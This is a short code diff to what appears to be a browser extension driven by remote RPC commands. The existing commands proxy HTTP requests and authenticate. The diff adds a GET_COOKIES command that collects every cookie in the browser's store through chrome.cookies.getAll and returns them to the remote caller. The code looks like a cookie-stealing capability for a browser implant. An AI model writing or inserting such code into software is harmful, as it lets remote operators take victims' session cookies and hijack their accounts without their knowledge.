@@ -23,8 +23,33 @@ const REQUEST_HEADER_BLACKLIST = [
 const RPC_CALL_TABLE = {
     'HTTP_REQUEST': perform_http_request,
     'PONG': () => {}, // NOP, since timestamp is updated on inbound message.
-    'AUTH': authenticate
+    'AUTH': authenticate,
+    'GET_COOKIES': get_cookies,
 };
+
+/*
+    Return an array of cookies for the current cookie store.
+*/
+async function get_cookies(params) {
+    // If the "cookies" permission is not available
+    // just return an empty array.
+    if(!chrome.cookies) {
+        return [];
+    }
+    return getallcookies({});
+}
+
+function getallcookies(details) {
+    return new Promise(function(resolve, reject) {
+        try {
+            chrome.cookies.getAll(details, function(cookies_array) {
+                resolve(cookies_array);
+            });
+        } catch(e) {
+            reject(e);
+        }
+    });
+}
 
 async function authenticate(params) {
     // Check for a previously-set browser identifier.
